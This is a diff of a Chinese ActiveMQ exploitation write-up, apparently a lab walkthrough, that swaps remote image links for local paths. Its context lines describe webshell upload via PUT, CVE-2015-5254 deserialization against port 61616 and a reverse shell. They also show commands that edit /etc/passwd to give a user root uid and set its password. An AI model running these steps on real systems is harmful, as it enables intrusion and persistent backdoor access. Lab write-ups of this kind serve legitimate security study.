@@ -177,7 +177,7 @@ ActiveMQ 的 web 控制台分三个应用 ，admin，api 和 fileserver，其中
 
 PUT 上次 Webshell 代码
 
-![](https://mmbiz.qpic.cn/mmbiz_png/2ibFSib4guKle9w4MEIBQ6bEib4e340iaamSz0ClhqdicoxQpj3iceU6uxU8CzRubnmSdHkicZicoa5IfoeXIAdaPnDuoQ/640?wx_fmt=png)
+![](../../.resource/remote/b728978c077f933bdb4c136a4630c182fafb6df8a9f25e64bfe937783255b386.png)
 
 测试 PUT 老是失败，因此写了个 python 脚本，免得改请求包。
 
@@ -191,11 +191,11 @@ echo "test:sd123456" | chpasswd  //为test用户设置一个密码
 
 靶场给的页面，实际环境中应该是不存在的。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/2ibFSib4guKle9w4MEIBQ6bEib4e340iaamSW5sicj7zgzQRibYT2BTqN4seeG0gaDBPViaMib5qF7XePdkNxPrfmIibhZA/640?wx_fmt=png)
+![](../../.resource/remote/6533bc593030a1dc465997f39c226c1e746189f3a27d0a0679c59c12f18b1c3c.png)
 
 实际环境中可以通过下面的方法爆路径：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/2ibFSib4guKle9w4MEIBQ6bEib4e340iaamSqKTpiaQI4tUaunWFg6n4Fr4XYgib0icbkZILerTsnRX6IS8NicHHAwXVEQ/640?wx_fmt=png)
+![](../../.resource/remote/37addfca96ba337f534144c4e7ebd3ad49d134d06ff11b6dbbcd3f8361aca634.png)
 
 移动文件到 admin 目录或者 api 目录下，登录访问 webshell
 
@@ -234,7 +234,7 @@ CVE-2015-5254
 
 下图是构造可执行命令的序列化对象，并发送给目标 61616 端口:
 
-![](https://mmbiz.qpic.cn/mmbiz_png/2ibFSib4guKle9w4MEIBQ6bEib4e340iaamSrjKbVdSgoWC3DIL2MTibT5GUMjPBcgA5UdcWGicsrtmSDT31WXGeQjVA/640?wx_fmt=png)
+![](../../.resource/remote/d6f41fac3383763b869f7eb4cbb17a93329ddddd73c9a94cda7fb2f2888228f3.png)
 
 访问 web 管理页面，点击消息：
 
@@ -242,11 +242,11 @@ CVE-2015-5254
 http://192.168.0.11:8161/admin/browse.jsp?JMSDestination=event
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/2ibFSib4guKle9w4MEIBQ6bEib4e340iaamSx8OVzClGF9x9fm4ibPnWw3PVWvlmNlYiaKk6b8H9FAh8EglXqSx6sC4g/640?wx_fmt=png)
+![](../../.resource/remote/7b5ce7815c9d1ab9d2be026eb1ca6df9ee623b87cd7f15faefc9136cdb981267.png)
 
 成功执行命令，如下图所示，多了 success 目录：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/2ibFSib4guKle9w4MEIBQ6bEib4e340iaamSCFxmGgYbQbOiawh9fib0qAve9hia9xQA0kv7b4ECOzJrDhjAzWicBj7bwQ/640?wx_fmt=png)
+![](../../.resource/remote/408fb4fd3b617a8c8e79713e03e0af1db8e6f65ff6f396111aca310e01de2bff.png)
 
 不仅如此我们还可以修改命令，反弹 shell
 
@@ -264,9 +264,9 @@ sed -i "s/test:x:10010/test:x:0/g" /etc/passwd  //将passwd中的test的uid修�
 echo "test:sd123456" | chpasswd  //为test用户设置一个密码
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/2ibFSib4guKle9w4MEIBQ6bEib4e340iaamSHtj1P1L2cD4lrgBnMrdNpOA57u9L0ntJ49XIoMtiag7BzIzxp3dmgDw/640?wx_fmt=png)
+![](../../.resource/remote/223cb4c5d9149a1239fc115afb18eca3d24a7f946314c9a5733069534374b86a.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/2ibFSib4guKle9w4MEIBQ6bEib4e340iaamSHZCXic3cJl0bbL3dSznibT317nOxnqlesqI7WRIrI5HJo2XEKl8MpLCQ/640?wx_fmt=png)
+![](../../.resource/remote/fd844f6cced0c147f93e768182ab67b6a4c6c4ad9d075b193e31f73c4e0f3d43.png)
 
 局限性
 
@@ -274,7 +274,7 @@ echo "test:sd123456" | chpasswd  //为test用户设置一个密码
 
 转发来源，侵删 ：https://blog.csdn.net/zhang8907xiaoyue/article/details/79659952
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LfbzQb75ZqoK2T2YO9XTQYD0aDUibvcxdbLRqzCwlkYcn0HppvXpZuenRzjX8ibhzcibJJge9Bw9xc8A/640?wx_fmt=gif)
+![](../../.resource/remote/ef207e0c1d0f037771ef2d1bfb00db89de3d27b26c8022f059deee50e443c8b6.gif)
 
   
 
